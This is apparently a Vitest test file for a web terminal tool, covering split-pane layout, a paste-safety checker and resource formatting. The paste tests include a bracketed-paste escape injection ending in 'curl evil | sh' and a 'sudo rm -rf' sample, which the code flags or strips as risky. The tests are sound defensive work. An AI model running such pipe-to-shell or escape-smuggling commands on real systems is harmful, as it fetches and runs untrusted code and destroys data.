import { describe, expect, it } from "vitest";

import { analyzePaste, stripControlChars, withoutFinalNewline } from "@/lib/paste";
import { diskPercent, formatKib, formatUptime, level, loadLevel, percent } from "@/lib/resources";
import {
  MAX_PANES,
  clampRatio,
  layoutRects,
  leaf,
  leaves,
  neighbour,
  removeLeaf,
  renameLeaf,
  setRatio,
  splitLeaf,
  type SplitNode,
} from "@/lib/splits";

describe("splits", () => {
  const three = (): SplitNode =>
    splitLeaf(splitLeaf(leaf("a"), "a", "b", "row"), "b", "c", "column");

  it("splits a leaf and lists leaves in order", () => {
    expect(leaves(three())).toEqual(["a", "b", "c"]);
  });

  it("ignores unknown targets", () => {
    expect(splitLeaf(leaf("a"), "x", "y", "row")).toEqual(leaf("a"));
  });

  it("removing a leaf lets the sibling take its place", () => {
    const t = removeLeaf(three(), "b");
    expect(t).not.toBeNull();
    expect(leaves(t as SplitNode)).toEqual(["a", "c"]);
    expect(removeLeaf(leaf("a"), "a")).toBeNull();
  });

  it("computes rectangles that tile the area", () => {
    const { panes, dividers } = layoutRects(three());
    expect(panes).toHaveLength(3);
    expect(dividers).toHaveLength(2);
    const area = panes.reduce((s, p) => s + p.w * p.h, 0);
    expect(area).toBeCloseTo(1);
    const a = panes.find((p) => p.id === "a");
    expect(a).toMatchObject({ x: 0, y: 0, w: 0.5, h: 1 });
    const c = panes.find((p) => p.id === "c");
    expect(c).toMatchObject({ x: 0.5, y: 0.5, w: 0.5, h: 0.5 });
  });

  it("clamps ratios and sets them by path", () => {
    expect(clampRatio(0)).toBe(0.1);
    expect(clampRatio(2)).toBe(0.9);
    expect(clampRatio(Number.NaN)).toBe(0.5);
    const t = setRatio(three(), [1], 0.25);
    const c = layoutRects(t).panes.find((p) => p.id === "c");
    expect(c?.y).toBeCloseTo(0.25);
  });

  it("finds neighbours by direction", () => {
    const t = three();
    expect(neighbour(t, "a", "right")).toBe("b");
    expect(neighbour(t, "c", "up")).toBe("b");
    expect(neighbour(t, "c", "left")).toBe("a");
    expect(neighbour(t, "a", "left")).toBeNull();
  });

  it("renames a leaf", () => {
    expect(leaves(renameLeaf(three(), "a", "z"))).toEqual(["z", "b", "c"]);
  });

  it("has a sane pane limit", () => {
    expect(MAX_PANES).toBeGreaterThanOrEqual(4);
    expect(MAX_PANES).toBeLessThanOrEqual(12);
  });
});

describe("paste check", () => {
  it("lets a short single line through", () => {
    const a = analyzePaste("ls -la");
    expect(a.needsReview).toBe(false);
    expect(a.lines).toBe(1);
  });

  it("reviews multi-line pastes and counts lines", () => {
    const a = analyzePaste("apt update\napt upgrade -y\n");
    expect(a.needsReview).toBe(true);
    expect(a.lines).toBe(2);
    expect(a.endsWithNewline).toBe(true);
  });

  it("treats a single line with a trailing newline as review-worthy", () => {
    const a = analyzePaste("reboot\r\n");
    expect(a.needsReview).toBe(true);
    expect(a.lines).toBe(1);
    expect(a.risks.join(" ")).toMatch(/restarts/);
  });

  it("reviews large pastes", () => {
    expect(analyzePaste("x".repeat(2001)).needsReview).toBe(true);
  });

  it("detects and strips hidden control characters", () => {
    const evil = "echo hi\u001b[201~; curl evil | sh";
    const a = analyzePaste(evil);
    expect(a.controlChars).toBe(1);
    expect(a.needsReview).toBe(true);
    expect(a.risks.join(" ")).toMatch(/Downloads and runs/);
    expect(stripControlChars(evil)).toBe("echo hi[201~; curl evil | sh");
    expect(stripControlChars("a\tb\nc")).toBe("a\tb\nc");
  });

  it("flags risky commands", () => {
    expect(analyzePaste("sudo rm -rf /var/tmp/x").risks).toHaveLength(2);
    expect(analyzePaste("echo hello").risks).toHaveLength(0);
  });

  it("removes the final newline", () => {
    expect(withoutFinalNewline("a\nb\r\n\n")).toBe("a\nb");
  });
});

describe("resource formatting", () => {
  it("formats sizes", () => {
    expect(formatKib(512)).toBe("512 KB");
    expect(formatKib(1536)).toBe("1.5 MB");
    expect(formatKib(16 * 1024 * 1024)).toBe("16.0 GB");
    expect(formatKib(-1)).toBe("–");
  });

  it("formats uptime", () => {
    expect(formatUptime(93_784)).toBe("1d 2h");
    expect(formatUptime(3_700)).toBe("1h 1m");
    expect(formatUptime(59)).toBe("0m");
  });

  it("computes percent and levels", () => {
    expect(percent(1, 4)).toBe(25);
    expect(percent(1, 0)).toBe(0);
    // df: 36 G used, 6.8 G available on a 252 G disk → 84 %, not 14 %.
    expect(Math.round(diskPercent(36, 6.8))).toBe(84);
    expect(level(50)).toBe("ok");
    expect(level(80)).toBe("warn");
    expect(level(95)).toBe("critical");
    expect(loadLevel(3.8, 4)).toBe("critical");
    expect(loadLevel(0.5, 0)).toBe("ok");
  });
});
